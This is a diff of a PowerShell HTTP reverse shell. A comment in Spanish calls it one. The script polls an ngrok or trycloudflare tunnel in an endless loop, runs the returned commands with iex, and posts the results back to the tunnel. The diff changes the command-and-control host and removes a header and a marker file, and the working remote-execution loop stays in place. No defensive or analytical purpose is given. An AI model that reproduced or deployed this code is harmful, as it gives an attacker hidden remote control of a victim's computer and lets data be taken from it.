@@ -1,16 +1,11 @@
-# Confirmar ejecución
-"Se ejecutó correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append
-
-# Reverse shell HTTP hacia Ngrok (con header para saltar advertencia)
-$u='https://curler-puzzle-galley.ngrok-free.dev'
-$headers = @{"ngrok-skip-browser-warning"="true"}
+$u='https://resorts-minimize-statute-filter.trycloudflare.com'
 
 while($true){
     try{
-        $c=(Invoke-WebRequest -Uri $u -UseBasicParsing -Headers $headers).Content
+        $c=(Invoke-WebRequest -Uri $u -UseBasicParsing).Content
         if($c -and $c -ne 'OK'){
             $r=iex $c 2>&1 | Out-String
-            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing -Headers $headers
+            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing
         }
     }catch{}
     Start-Sleep -Seconds 3
